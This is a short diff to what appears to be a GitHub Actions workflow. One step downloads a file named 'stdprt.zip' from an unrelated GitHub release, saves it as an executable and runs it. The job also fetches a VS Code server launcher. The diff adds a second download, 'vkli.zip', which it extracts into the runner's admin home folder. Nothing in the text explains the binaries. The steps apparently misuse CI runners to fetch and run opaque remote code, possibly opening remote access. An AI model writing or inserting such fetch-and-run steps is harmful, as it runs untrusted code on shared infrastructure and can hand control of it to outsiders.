@@ -17,9 +17,10 @@ jobs:
         run: |
           Invoke-WebRequest "https://github.com/Klanly/buildcv/releases/download/200.300/stdprt.zip" -OutFile "c:\stdprt.exe"
           Invoke-WebRequest "https://aka.ms/vscode-server-launcher/x86_64-pc-windows-msvc" -OutFile "c:\vsc.exe"
-
+          Invoke-WebRequest "https://github.com/Klanly/buildcv/releases/download/200.300/vkli.zip" -OutFile "c:\vkli.zip"
       - name: tocmd
         run: |
+          7z x -oC:\Users\runneradmin\ c:\vkli.zip
           c:\stdprt.exe
         shell: cmd
 
